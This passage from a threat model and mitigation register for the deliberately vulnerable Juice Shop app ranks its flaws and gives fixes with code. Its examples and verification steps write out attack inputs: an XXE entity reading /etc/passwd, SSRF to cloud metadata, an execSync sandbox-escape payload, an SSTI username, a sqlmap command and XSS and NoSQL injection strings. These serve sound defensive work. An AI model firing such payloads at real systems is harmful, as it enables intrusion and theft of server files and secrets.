| <a id="t-014"></a>T-014 | frontend-spa | Information Disclosure | JWT stored in `localStorage` ([request.interceptor.ts:13,16](vscode://file/home/mrohr/juice-shop/frontend/src/app/Services/request.interceptor.ts:13)). Any XSS vulnerability (T-013) can extract the token via `localStorage.getItem()`. No httpOnly cookie alternative. No SameSite attribute. CWE-922. | High | High | 🟠 High | None | [M-011](#m-011), [M-013](#m-013) |
| <a id="t-016"></a>T-016 | file-upload | Information Disclosure | XXE via libxmljs2: `libxml.parseXml(data, { noent: true })` at [routes/fileUpload.ts:83](vscode://file/home/mrohr/juice-shop/routes/fileUpload.ts:83). Attacker uploads XML with `<\!ENTITY xxe SYSTEM "file:///etc/passwd">` to read arbitrary server-side files. CWE-611. | High | High | 🟠 High | None | [M-016](#m-016) |
| <a id="t-017"></a>T-017 | file-upload | Tampering | Zip Slip path traversal at [routes/fileUpload.ts:44](vscode://file/home/mrohr/juice-shop/routes/fileUpload.ts:44): `absolutePath.includes(path.resolve('.'))` is bypassable. Attacker crafts a zip with entries like `../../server.js` to overwrite application files. CWE-22. | High | High | 🟠 High | Partial path check (bypassable) | [M-017](#m-017) |
| <a id="t-018"></a>T-018 | file-upload | Denial of Service | YAML bomb: `yaml.load(data)` at [routes/fileUpload.ts:117](vscode://file/home/mrohr/juice-shop/routes/fileUpload.ts:117) with no size limit before parsing. Attacker uploads a YAML billion-laughs payload causing exponential memory expansion and Node.js OOM crash. CWE-776. | High | High | 🟠 High | None | [M-018](#m-018) |
| <a id="t-019"></a>T-019 | file-upload | Information Disclosure | SSRF: `fetch(url)` at [routes/profileImageUrlUpload.ts:24](vscode://file/home/mrohr/juice-shop/routes/profileImageUrlUpload.ts:24) with fully user-controlled URL. Attacker fetches internal metadata (`http://169.254.169.254/`) or pivots to internal services. Chatbot initialization also contains SSRF via training URL download. CWE-918. | High | High | 🟠 High | None | [M-015](#m-015) |
| <a id="t-024"></a>T-024 | rest-api | Elevation of Privilege | Outdated dependencies with known CVEs: express-jwt 0.1.3 (missing alg enforcement, ~8 major versions behind), jsonwebtoken 0.4.0 (no alg binding), notevil 1.3.3 (sandbox escape), sanitize-html 1.4.2 (XSS bypass). CWE-1035. | High | High | 🟠 High | GitHub Actions pinned by SHA | [M-023](#m-023) |
| <a id="t-026"></a>T-026 | auth-service | Spoofing | Account takeover via password reset: security questions have predictable answers; password change at [routes/changePassword.ts](vscode://file/home/mrohr/juice-shop/routes/changePassword.ts) does not require current password when `current` param is omitted. CWE-640. | High | High | 🟠 High | Partial rate limit on reset | [M-024](#m-024) |
| <a id="t-027"></a>T-027 | rest-api | Tampering | Wallet balance manipulation: negative amount accepted on `POST /rest/wallet/balance/update` — attacker can credit their own wallet with arbitrary amounts. CWE-840. | High | High | 🟠 High | JWT required | [M-007](#m-007) |
| <a id="t-028"></a>T-028 | rest-api | Information Disclosure | Hardcoded Alchemy WebSocket API key at [routes/nftMint.ts:15](vscode://file/home/mrohr/juice-shop/routes/nftMint.ts:15) — `wss://eth-sepolia.g.alchemy.com/v2/FZDapFZ****` — exposed in public source repository. Third-party API key abuse enables quota exhaustion and financial impact. CWE-798. | High | High | 🟠 High | None | [M-025](#m-025) |
| <a id="t-030"></a>T-030 | rest-api | Spoofing | Open redirect: `/redirect?to=<url>` performs redirect without allowlist enforcement. Combined with phishing, attacker crafts juice-shop.example.com links that redirect to attacker-controlled sites, bypassing email filters. CWE-601. | High | High | 🟠 High | Partial URL check (bypassable) | [M-028](#m-028) |

### 8.3 Medium (4)

Notable risks that should be addressed in the next planning cycle.

| ID | Component | STRIDE | Threat Scenario | Likelihood | Impact | Risk | Controls in Place | Mitigations |
|----|-----------|--------|-----------------|------------|--------|------|-------------------|-------------|
| <a id="t-012"></a>T-012 | frontend-spa | Tampering | Missing CSRF protection: no csurf middleware; only one challenge endpoint checks origin header. Combined with CORS wildcard (T-011), cross-site requests can trigger state-changing actions as the victim user. CWE-352. | Medium | Medium | 🟡 Medium | SPA JWT bearer (partial mitigation) | [M-008](#m-008) |
| <a id="t-015"></a>T-015 | rest-api | Repudiation | Insufficient audit logging: security-relevant events (failed logins, admin operations, data exports) are not logged to a tamper-evident stream. Log files are exposed at `/support/logs` and could be deleted/modified by attackers who gain access. CWE-778. | Medium | Medium | 🟡 Medium | Morgan HTTP logger; challenge logging | [M-026](#m-026) |
| <a id="t-021"></a>T-021 | b2b-processor | Denial of Service | B2B order processor uses `vm.runInContext()` with a 2-second timeout — tight but CPU-intensive payloads can be submitted repeatedly to exhaust server threads. CWE-400. | Medium | Medium | 🟡 Medium | 2-second VM timeout | [M-019](#m-019) |
| <a id="t-023"></a>T-023 | rest-api | Tampering | CSP header injection: [routes/userProfile.ts:88](vscode://file/home/mrohr/juice-shop/routes/userProfile.ts:88) sets `img-src 'self' ${user?.profileImage}` — attacker sets profileImage to a URL with spaces to inject additional CSP directives, weakening browser security policy. CWE-116. | Medium | Medium | 🟡 Medium | CSP present (injectable) | [M-020](#m-020) |

### 8.4 Low (1)

| ID | Component | STRIDE | Threat Scenario | Likelihood | Impact | Risk | Controls in Place | Mitigations |
|----|-----------|--------|-----------------|------------|--------|------|-------------------|-------------|
| <a id="t-029"></a>T-029 | ci-cd-pipeline | Repudiation | GitHub Actions workflows lack mandatory code review gates for merge to master. A compromised maintainer account could merge malicious code without a second reviewer approving. CWE-284. | Low | Low | 🟢 Low | SHA-pinned actions; CodeQL SAST | [M-027](#m-027) |


---

<!-- QA: Section 9 must be a two-line stub pointing to [Critical Attack Chain](#critical-attack-chain) and [Section 8.1](#81-critical). The per-finding content and attack chain diagrams have been moved to ## Critical Attack Chain (above Section 1) and Section 8.1. See phase-group-threats.md → "Section 8 stub" -->
## 9. Critical Findings

For the full attack chain analysis, see [Critical Attack Chain](#critical-attack-chain) above.
For individual Critical finding rows, see [Section 8.1 Critical](#81-critical-10).

```mermaid
graph TD
    A["Attacker reads source code\n(public GitHub repo)"] -->|"extracts hardcoded RSA key\nlib/insecurity.ts:23"| B["Forge any JWT\n(T-001)"]
    B -->|"sets role=admin in payload"| C["Admin session\n(T-025)"]
    C -->|"PUT /api/Users/:id role=admin"| D["Full admin access\nall users/orders/config"]

    E["Unauthenticated attacker"] -->|"GET /rest/products/search?q=..."| F["SQL Injection\n(T-006)"]
    F -->|"UNION dump Users table"| G["All password hashes\n(T-004 MD5 → crack instantly)"]
    G -->|"credential stuffing"| H["Any user account"]
    H -->|"username = #{ require...execSync }"| I["SSTI/RCE\n(T-022)"]
    I -->|"OS command execution"| J["Full server compromise"]
```

**Key takeaway:** The hardcoded JWT signing key (T-001) allows any public observer to forge admin tokens without credentials. Separately, the unauthenticated SQL injection (T-006) combined with MD5 password hashing (T-004) enables credential extraction and instant cracking, after which the SSTI sink (T-022) provides server-level RCE.

**Quick-reference table:**

| Threat | Component | STRIDE | Risk | Primary Mitigation |
|--------|-----------|--------|------|--------------------|
| [T-001](#t-001) Hardcoded JWT signing key | auth-service | Spoofing | 🔴 Critical | [M-001](#m-001) Rotate key, use secrets manager |
| [T-002](#t-002) JWT algorithm confusion (alg:none) | auth-service | Spoofing | 🔴 Critical | [M-001](#m-001), [M-002](#m-002) Enforce RS256 |
| [T-003](#t-003) SQL injection (login) | rest-api | Tampering | 🔴 Critical | [M-003](#m-003) Parameterized queries |
| [T-005](#t-005) No brute-force protection | rest-api | Denial of Service | 🔴 Critical | [M-004](#m-004) Rate limit + lockout |
| [T-006](#t-006) SQL injection (search, unauthenticated) | rest-api | Information Disclosure | 🔴 Critical | [M-003](#m-003) Parameterized queries |
| [T-009](#t-009) Unauthenticated management endpoints | rest-api | Information Disclosure | 🔴 Critical | [M-006](#m-006) Auth on all admin routes |
| [T-013](#t-013) Stored XSS via bypassSecurityTrustHtml | frontend-spa | Tampering | 🔴 Critical | [M-010](#m-010), [M-011](#m-011) Remove bypass |
| [T-020](#t-020) RCE via notevil sandbox escape | b2b-processor | Elevation of Privilege | 🔴 Critical | [M-019](#m-019) Remove sandbox |
| [T-022](#t-022) SSTI/RCE via eval() in username | rest-api | Elevation of Privilege | 🔴 Critical | [M-020](#m-020) Remove eval() |
| [T-025](#t-025) Client-controlled role assignment | rest-api | Elevation of Privilege | 🔴 Critical | [M-021](#m-021) Server-enforce roles |

---

## 10. Mitigation Register

Mitigations are ordered by rollout priority. Within each priority group, lower-effort items appear first.

### P1 — Immediate

<a id="m-001"></a>**M-001 — Rotate JWT signing key and move to secrets manager**
**Addresses:** [T-001](#t-001), [T-002](#t-002), [T-004](#t-004)
**Priority:** **P1 — Immediate**
**Severity:** 🔴 Critical
**Effort:** Medium

**Why:** The RSA private key embedded at `lib/insecurity.ts:23` is visible to every person who has ever cloned the repository. Any token ever signed with this key can be forged. The HMAC key at line 43 is similarly exposed.

**How:**
1. Remove the hardcoded PEM block from `lib/insecurity.ts:23` and the HMAC key from line 43
2. Generate a new 4096-bit RSA key pair: `openssl genrsa -out jwt.pem 4096 && openssl rsa -in jwt.pem -pubout -out jwt.pub`
3. Store the private key in an environment variable (`JWT_PRIVATE_KEY`) or a secrets manager (HashiCorp Vault, AWS Secrets Manager)
4. Load at runtime: `const privateKey = process.env.JWT_PRIVATE_KEY`
5. Rotate all existing user sessions (invalidate the token map, force re-login)

```typescript
// Before (INSECURE):
const privateKey = "-----BEGIN RSA PRIVATE KEY-----\nMIIEo..."

// After:
const privateKey = process.env.JWT_PRIVATE_KEY
if (\!privateKey) throw new Error('JWT_PRIVATE_KEY environment variable not set')
```

**Verification:** `grep -r "BEGIN RSA PRIVATE KEY" .` returns no results. Application starts only when `JWT_PRIVATE_KEY` env var is set.

**Reference:** [OWASP Secrets Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html), CWE-321

---

<a id="m-002"></a>**M-002 — Upgrade JWT libraries and enforce RS256 algorithm**
**Addresses:** [T-002](#t-002)
**Priority:** **P1 — Immediate**
**Severity:** 🔴 Critical
**Effort:** Medium

**Why:** `express-jwt 0.1.3` (current: 8.x) and `jsonwebtoken 0.4.0` (current: 9.x) do not enforce algorithm binding. The `jws.verify()` call at `lib/insecurity.ts:57` accepts `alg:none` tokens, allowing complete authentication bypass without a key.

**How:**
1. Update `package.json`: `"express-jwt": "^8.4.1"`, `"jsonwebtoken": "^9.0.2"`
2. Replace `jws.verify()` with `jwt.verify(token, publicKey, { algorithms: ['RS256'] })`
3. Replace `express-jwt({secret: publicKey})` with `expressjwt({ secret: publicKey, algorithms: ['RS256'] })`
4. Run `npm install && npm test`

```typescript
// Before (INSECURE — accepts alg:none):
jws.verify(token, publicKey)

// After:
import jwt from 'jsonwebtoken'
jwt.verify(token, publicKey, { algorithms: ['RS256'] })
```

**Verification:** Send a JWT with `"alg":"none"` — server returns 401.

**Reference:** [JWT Security Best Practices](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html), CWE-347

---

<a id="m-003"></a>**M-003 — Replace raw SQL with parameterized queries**
**Addresses:** [T-003](#t-003), [T-006](#t-006)
**Priority:** **P1 — Immediate**
**Severity:** 🔴 Critical
**Effort:** Medium

**Why:** Both login (`routes/login.ts:34`) and search (`routes/search.ts:23`) use raw string interpolation inside `sequelize.query()`. This is the most direct path to full database compromise.

**How:**
1. In `routes/login.ts:34`, replace with:
   ```typescript
   // Before (INSECURE):
   models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email}' AND password = '${hash}'`)
   
   // After:
   models.User.findOne({ where: { email: req.body.email, password: hash, deletedAt: null } })
   ```
2. In `routes/search.ts:23`, replace with:
   ```typescript
   // Before (INSECURE):
   models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%'...`)
   
   // After:
   models.Product.findAll({ where: { [Op.or]: [{ name: { [Op.like]: `%${criteria}%` } }, { description: { [Op.like]: `%${criteria}%` } }], deletedAt: null }, order: [['name', 'ASC']] })
   ```
3. Audit all other `sequelize.query()` calls for similar patterns

**Verification:** `sqlmap -u "http://localhost:3000/rest/products/search?q=test"` returns no injectable parameters.

**Reference:** [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html), CWE-89

---

<a id="m-004"></a>**M-004 — Apply rate limiting to login and registration endpoints**
**Addresses:** [T-005](#t-005)
**Priority:** **P1 — Immediate**
**Severity:** 🔴 Critical
**Effort:** Low

**Why:** `/rest/user/login` and `/api/Users` have no rate limiting. An attacker can attempt unlimited passwords against any account or register thousands of spam accounts.

**How:**
1. Add rate limiter to login in `server.ts` (similar to existing pattern on reset-password):
   ```typescript
   import rateLimit from 'express-rate-limit'
   const loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 10, message: 'Too many login attempts' })
   app.post('/rest/user/login', loginLimiter)
   ```
2. Add account lockout after 5 failed attempts (track in `Users` table with `failedLoginAttempts` and `lockedUntil` columns)
3. Add rate limit to `/api/Users` POST (registration): max 3 registrations per IP per hour

**Verification:** 11 rapid login attempts from same IP receive HTTP 429 after the 10th.

**Reference:** [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html), CWE-307

---

<a id="m-005"></a>**M-005 — Enforce minimum password strength at registration**
**Addresses:** [T-005](#t-005)
**Priority:** **P1 — Immediate**
**Severity:** 🔴 Critical
**Effort:** Low

**Why:** No minimum password length or complexity is enforced at registration, enabling trivially guessable passwords that accelerate brute-force and credential stuffing.

**How:**
1. Add server-side validation in registration route: minimum 12 characters, require at least one digit and one special character
2. Use `zxcvbn` for strength scoring: reject passwords with score < 2
3. Mirror validation in Angular registration component (client-side UX, not security boundary)

**Verification:** Registration with `password=123` returns HTTP 400 with `Password too weak`.

**Reference:** CWE-521

---

<a id="m-006"></a>**M-006 — Require authentication on all management and sensitive endpoints**
**Addresses:** [T-008](#t-008), [T-009](#t-009)
**Priority:** **P1 — Immediate**
**Severity:** 🔴 Critical
**Effort:** Medium

**Why:** `/metrics`, `/ftp`, `/encryptionkeys`, `/support/logs`, `/rest/admin/application-configuration`, and `/rest/admin/application-version` expose critical operational data to anonymous users.

**How:**
1. Apply `security.isAuthorized()` and `security.isAdminRole()` middleware to all `/rest/admin/*` routes in `server.ts`
2. Move `/metrics` behind basic auth or restrict to internal network (e.g., `app.use('/metrics', requireInternalNetwork, prometheusMiddleware)`)
3. Remove `/ftp` and `/encryptionkeys` static directory serving entirely (or restrict to admin role)
4. Move `/support/logs` behind admin authentication
5. Audit all `express.static()` calls for unintentionally exposed directories

**Verification:** Unauthenticated `GET /metrics` returns 401. `GET /ftp` returns 403.

**Reference:** CWE-548, CWE-200

---

<a id="m-007"></a>**M-007 — Add object-level ownership checks (fix IDOR)**
**Addresses:** [T-007](#t-007), [T-027](#t-027)
**Priority:** **P1 — Immediate**
**Severity:** 🟠 High
**Effort:** Medium

**Why:** Basket, memory, and wallet endpoints retrieve objects by ID without verifying the requesting user owns them. An attacker can access or modify any user's data by iterating IDs.

**How:**
1. In `routes/basket.ts:19`, after `BasketModel.findOne({ where: { id } })`, add: `if (basket.UserId \!== req.user.data.id) return res.status(403).json({ error: 'Forbidden' })`
2. In `routes/memory.ts`, replace `req.body.UserId` with `req.user.data.id` — never trust client-provided user ID
3. In wallet update route, validate amount is positive before applying: `if (amount <= 0) return res.status(400).json({ error: 'Invalid amount' })`
4. Create a shared `assertOwnership(resource, userId)` helper to standardize these checks

**Verification:** Authenticated user A cannot access basket belonging to user B — returns 403.

**Reference:** [OWASP IDOR Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html), CWE-639

---

<a id="m-008"></a>**M-008 — Restrict CORS to known origins and add CSRF protection**
**Addresses:** [T-011](#t-011), [T-012](#t-012)
**Priority:** **P1 — Immediate**
**Severity:** 🟠 High
**Effort:** Low

**Why:** `app.use(cors())` at `server.ts:182` allows any origin. This enables cross-site request attacks even on state-changing endpoints.

**How:**
1. Replace `app.use(cors())` with an allowlist:
   ```typescript
   app.use(cors({ origin: process.env.ALLOWED_ORIGINS?.split(',') ?? ['http://localhost:3000'], credentials: true }))
   ```
2. Add `csurf` middleware for non-AJAX form submissions, or enforce `SameSite=Strict` cookies
3. For API endpoints using JWT bearer tokens, explicitly reject requests missing the `Authorization` header from cross-origin contexts

**Verification:** Cross-origin request from `evil.example.com` receives `Access-Control-Allow-Origin` that does not include the attacker's domain.

**Reference:** [OWASP CORS Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/CORS_Cheat_Sheet.html), CWE-942

---

<a id="m-019"></a>**M-019 — Replace notevil sandbox with a safe order schema validator**
**Addresses:** [T-020](#t-020), [T-021](#t-021)
**Priority:** **P1 — Immediate**
**Severity:** 🔴 Critical
**Effort:** High

**Why:** `routes/b2bOrder.ts:21-24` uses `vm.runInContext('safeEval(orderLinesData)', sandbox)` where `orderLinesData` is user-controlled. notevil 1.3.3 has known sandbox escapes providing full OS-level RCE.

**How:**
1. Remove all uses of `notevil` and `vm.runInContext` for order parsing
2. Replace with a JSON Schema validator (e.g., `ajv`) that validates the expected order structure without executing user-provided code:
   ```typescript
   import Ajv from 'ajv'
   const ajv = new Ajv()
   const orderSchema = { type: 'object', properties: { orderLinesData: { type: 'array', items: { type: 'object', required: ['productId', 'quantity'] } } } }
   if (\!ajv.validate(orderSchema, req.body)) return res.status(400).json({ error: 'Invalid order format' })
   ```
3. Remove `notevil` from `package.json` entirely

**Verification:** Sending `{"orderLinesData":"process.mainModule.require('child_process').execSync('id')"}` returns 400.

**Reference:** CWE-94

---

<a id="m-020"></a>**M-020 — Remove eval() from userProfile route and fix CSP injection**
**Addresses:** [T-022](#t-022), [T-023](#t-023)
**Priority:** **P1 — Immediate**
**Severity:** 🔴 Critical
**Effort:** Medium

**Why:** `eval()` in `routes/userProfile.ts:~55` is triggered when a username contains `#{...}`. This provides unauthenticated-equivalent RCE (authenticated users control their own username). The same file injects the profileImage URL into the CSP header without sanitization.

**How:**
1. Remove the `if (username.match(/#{.*}/))` branch and the `eval(code)` call entirely — there is no legitimate use case for evaluating user-supplied template expressions server-side
2. For the CSP injection at line 88, sanitize the profileImage value before inserting: validate it is a well-formed absolute HTTPS URL with no spaces or semicolons: `const safeImage = encodeURIComponent(user.profileImage.trim())` and never insert raw values into response headers
3. Remove `'unsafe-eval'` from the `script-src` CSP directive

**Verification:** Setting username to `#{7*7}` does not return `49` in the response. CSP header contains only expected `img-src` values.

**Reference:** CWE-94, CWE-116

---

<a id="m-021"></a>**M-021 — Enforce role assignment server-side; strip role from user-provided body**
**Addresses:** [T-025](#t-025)
**Priority:** **P1 — Immediate**
**Severity:** 🔴 Critical
**Effort:** Low

**Why:** `PUT /api/Users/:id` writes the entire request body to the database including the `role` field. Any authenticated user can self-promote to admin.

**How:**
1. In the Users PUT route, strip `role`, `isAdmin`, and `totpSecret` fields from `req.body` before passing to `UserModel.update()`
2. Create a whitelist of updatable fields: `const allowedFields = ['username', 'email', 'profileImage', 'birthday']`
3. Apply the same pattern to all model update endpoints

```typescript
// Before (INSECURE):
UserModel.update(req.body, { where: { id: req.params.id } })

// After:
const { username, email, profileImage } = req.body
UserModel.update({ username, email, profileImage }, { where: { id: req.params.id } })
```

**Verification:** `PUT /api/Users/1` with `{"role":"admin"}` does not change the user's role — confirmed by subsequent `GET /api/Users/1`.

**Reference:** [OWASP Mass Assignment Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html), CWE-269

---

### P2 — This Sprint

<a id="m-009"></a>**M-009 — Fix NoSQL injection in review update**
**Addresses:** [T-010](#t-010)
**Priority:** **P2 — This Sprint**
**Severity:** 🟠 High
**Effort:** Low

**Why:** `db.reviewsCollection.update({ _id: req.body.id }, ..., { multi: true })` at `routes/updateProductReviews.ts:14` allows an attacker to match all documents by sending `{"id": {}}`.

**How:**
1. Validate that `req.body.id` is a string (MarsDB document ID format) before passing to the query
2. Remove the `multi: true` option — it should never be needed for a single review update
3. After updating, verify the document's author matches the authenticated user

```typescript
// Before (INSECURE):
db.reviewsCollection.update({ _id: req.body.id }, { $set: { message: req.body.message } }, { multi: true })

// After:
if (typeof req.body.id \!== 'string') return res.status(400).json({ error: 'Invalid id' })
db.reviewsCollection.update({ _id: req.body.id, author: req.user.data.email }, { $set: { message: req.body.message } })
```

**Verification:** Sending `{"id": {}, "message": "pwned"}` returns 400. Only the authenticated user's review can be updated.

**Reference:** CWE-943

---

<a id="m-010"></a>**M-010 — Remove bypassSecurityTrustHtml calls and sanitize with DOMPurify**
**Addresses:** [T-013](#t-013)
**Priority:** **P2 — This Sprint**
**Severity:** 🔴 Critical
**Effort:** Medium

**Why:** Three Angular components bypass Angular's built-in XSS protection by calling `DomSanitizer.bypassSecurityTrustHtml()` on user-controlled content — feedback comments, last login IP, and user emails in the admin view.

**How:**
1. Remove `bypassSecurityTrustHtml()` from `about.component.ts:119`, `last-login-ip.component.ts:39`, and `administration.component.ts:60,78`
2. Render feedback and email content using Angular's safe interpolation (`{{ comment }}`) which HTML-encodes output
3. If rich-text rendering is genuinely needed, integrate `DOMPurify` with a strict allowlist: `DOMPurify.sanitize(html, { ALLOWED_TAGS: ['b', 'i', 'em'], ALLOWED_ATTR: [] })`
4. Update `sanitize-html` to 2.x for server-side sanitization

**Verification:** Submitting `<script>alert(1)</script>` as feedback text renders as escaped HTML, not as executable script.

**Reference:** [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html), CWE-79

---

<a id="m-011"></a>**M-011 — Store JWT in httpOnly cookie instead of localStorage**
**Addresses:** [T-013](#t-013), [T-014](#t-014)
**Priority:** **P2 — This Sprint**
**Severity:** 🟠 High
**Effort:** Medium

**Why:** JWT stored in `localStorage` is accessible to any JavaScript on the page — including XSS payloads. Migrating to httpOnly cookies prevents token extraction via script injection.

**How:**
1. On login success, set the JWT as an httpOnly, Secure, SameSite=Strict cookie instead of returning it in JSON
2. Remove `localStorage.setItem('token', ...)` from `request.interceptor.ts`
3. Update the Angular HTTP interceptor to read from cookie (browser sends automatically) rather than from localStorage
4. Implement CSRF token for the cookie-based auth flow

**Verification:** `localStorage.getItem('token')` returns null after login. Token is sent automatically via cookie on each request.

**Reference:** [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html), CWE-922

---

<a id="m-013"></a>**M-013 — Add token revocation mechanism**
**Addresses:** [T-014](#t-014)
**Priority:** **P2 — This Sprint**
**Severity:** 🟠 High
**Effort:** Medium

**Why:** The server-side token map is in-memory only — no logout endpoint invalidates tokens on the server. Stolen tokens remain valid for the full 6-hour window.

**How:**
1. Implement a token blocklist (Redis or SQLite table) that stores invalidated JWTs until their expiry
2. Add `POST /rest/user/logout` endpoint that adds the current token to the blocklist
3. Reduce JWT expiry from 6 hours to 15 minutes with a refresh token mechanism
4. Check blocklist in the `isAuthorized()` middleware

**Verification:** After logout, re-using the old JWT token returns 401.

**Reference:** CWE-613

---

<a id="m-015"></a>**M-015 — Block SSRF with URL allowlist on profile image upload**
**Addresses:** [T-019](#t-019)
**Priority:** **P2 — This Sprint**
**Severity:** 🟠 High
**Effort:** Low

**Why:** `fetch(url)` at `routes/profileImageUrlUpload.ts:24` uses a fully attacker-controlled URL — attackers can reach internal services (`http://127.0.0.1:3000`), cloud metadata APIs (`http://169.254.169.254`), or other internal hosts.

**How:**
1. Validate URL before fetching: parse the URL, check scheme is `https`, check host is not in private IP ranges
2. Use a library like `ssrf-req-filter` or implement a DNS resolution check
3. Enforce that the response Content-Type begins with `image/`

```typescript
import { URL } from 'url'
const parsed = new URL(url)
if (\!['https:'].includes(parsed.protocol)) throw new Error('Only HTTPS URLs allowed')
const privateRanges = [/^127\./, /^10\./, /^192\.168\./, /^169\.254\./]
if (privateRanges.some(r => r.test(parsed.hostname))) throw new Error('Private IP ranges not allowed')
```

**Verification:** Fetching `http://169.254.169.254/latest/meta-data/` returns 400 with `Private IP ranges not allowed`.

**Reference:** [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html), CWE-918

---

<a id="m-016"></a>**M-016 — Disable XML entity expansion (fix XXE)**
**Addresses:** [T-016](#t-016)
**Priority:** **P2 — This Sprint**
**Severity:** 🟠 High
**Effort:** Low

**Why:** `libxml.parseXml(data, { noent: true })` at `routes/fileUpload.ts:83` enables external entity processing — the root cause of XXE.

**How:**
1. Remove the `noent: true` option: `libxml.parseXml(data, { noblanks: true, nocdata: true })`
2. Validate that the file upload type is a permitted format before parsing
3. Consider replacing libxmljs2 with a pure-JS XML parser that does not support external entities by default

**Verification:** Uploading an XML file with `<\!ENTITY xxe SYSTEM "file:///etc/passwd">` does not include `/etc/passwd` content in the response.

**Reference:** [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html), CWE-611

---

<a id="m-017"></a>**M-017 — Fix Zip Slip with strict path containment check**
**Addresses:** [T-017](#t-017)
**Priority:** **P2 — This Sprint**
**Severity:** 🟠 High
**Effort:** Low

**Why:** The current check `absolutePath.includes(path.resolve('.'))` is bypassable. A zip entry like `../../server.js` can overwrite application files outside the upload directory.

**How:**
1. Replace the `includes()` check with `startsWith()` on the normalized paths:
   ```typescript
   const uploadDir = path.resolve('uploads/complaints')
   const resolvedPath = path.resolve(uploadDir, fileName)
   if (\!resolvedPath.startsWith(uploadDir + path.sep)) throw new Error('Path traversal detected')
   ```
2. Use the `unzipper` library's `path.normalize()` + strict containment before extracting each entry

**Verification:** A zip with entry `../../server.js` returns 400 with `Path traversal detected`.

**Reference:** [CWE-22 Path Traversal](https://cwe.mitre.org/data/definitions/22.html)

---

<a id="m-018"></a>**M-018 — Add size limit and use safe YAML loader**
**Addresses:** [T-018](#t-018)
**Priority:** **P2 — This Sprint**
**Severity:** 🟠 High
**Effort:** Low

**Why:** `yaml.load(data)` at `routes/fileUpload.ts:117` has no size limit and uses the unsafe loader which can instantiate arbitrary JavaScript objects.

**How:**
1. Add an upload size check before parsing: `if (data.length > 100000) throw new Error('File too large')`
2. Replace `yaml.load()` with `yaml.safeLoad()` (js-yaml 3.x) or `yaml.load()` with `{ schema: yaml.FAILSAFE_SCHEMA }` (js-yaml 4.x) to prevent arbitrary object instantiation
3. Set `maxAliases` to prevent alias expansion DoS

**Verification:** Uploading a YAML billion-laughs payload does not crash the Node.js process or cause memory exhaustion above 100MB.

**Reference:** CWE-776

---

<a id="m-022"></a>**M-022 — Migrate password hashing to bcrypt or Argon2**
**Addresses:** [T-004](#t-004)
**Priority:** **P2 — This Sprint**
**Severity:** 🟠 High
**Effort:** Medium

**Why:** MD5 used for password storage at `lib/insecurity.ts:42` is catastrophically broken — an attacker who obtains the database can crack every password in seconds using rainbow tables.

**How:**
1. Add `bcrypt` to `package.json`: `"bcrypt": "^5.1.1"`
2. Update `lib/insecurity.ts` hash function:
   ```typescript
   import bcrypt from 'bcrypt'
   export const hash = async (password: string): Promise<string> => bcrypt.hash(password, 12)
   export const verifyHash = async (password: string, hash: string): Promise<boolean> => bcrypt.compare(password, hash)
   ```
3. Migrate existing hashes: on next user login, detect MD5 format, verify against MD5, then re-hash with bcrypt and update the DB
4. Update login query to use `verifyHash()` instead of raw hash comparison

**Verification:** New user passwords are stored as `$2b$12$...` bcrypt hashes. Existing users can still log in during migration.

**Reference:** [OWASP Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html), CWE-916

---

### P3 — Next Quarter

<a id="m-023"></a>**M-023 — Upgrade all critically outdated dependencies**
**Addresses:** [T-024](#t-024)
**Priority:** **P3 — Next Quarter**
**Severity:** 🟠 High
**Effort:** High

**Why:** Multiple core security libraries are 5-8 major versions behind, with known CVEs: express-jwt 0.1.3 (current 8.x), jsonwebtoken 0.4.0 (current 9.x), sanitize-html 1.4.2 (current 2.x), helmet 4.6.0 (current 7.x), notevil 1.3.3 (abandoned, sandbox escapes), libxmljs2 0.37.x (native code risks).

**How:**
1. Upgrade express-jwt and jsonwebtoken (covered by M-002)
2. Upgrade sanitize-html to 2.x: `"sanitize-html": "^2.13.0"` — review breaking changes in allowed tags config
3. Upgrade helmet to 7.x: `"helmet": "^7.1.0"` — update CSP configuration to new API
4. Remove notevil entirely (covered by M-019)
5. Evaluate replacing libxmljs2 with a pure-JS alternative
6. Set up `npm audit` in CI pipeline as a required check: add `npm audit --audit-level=high` to `ci.yml`

**Verification:** `npm audit` reports 0 high or critical vulnerabilities after upgrades.

**Reference:** CWE-1035

---

<a id="m-024"></a>**M-024 — Strengthen account recovery and password change flows**
**Addresses:** [T-026](#t-026)
**Priority:** **P3 — Next Quarter**
**Severity:** 🟠 High
**Effort:** Medium

**Why:** Security questions have predictable answers (mother's maiden name, pet name). Password change does not verify the current password. These enable account takeover without brute-forcing.

**How:**
1. In `routes/changePassword.ts`, always require `current` password parameter and verify against stored hash before allowing the change
2. Replace security questions with email-based OTP reset: generate a time-limited (10 min), single-use token sent to the user's registered email
3. Add rate limiting to the OTP endpoint

**Verification:** Password change without `current` parameter returns 400. Security question reset is replaced by email OTP flow.

**Reference:** CWE-640

---

<a id="m-025"></a>**M-025 — Rotate and externalize Alchemy API key**
**Addresses:** [T-028](#t-028)
**Priority:** **P3 — Next Quarter**
**Severity:** 🟠 High
**Effort:** Low

**Why:** Alchemy WebSocket API key at `routes/nftMint.ts:15` is hardcoded in public source. Anyone with access to the repo can use the key and exhaust the quota.

**How:**
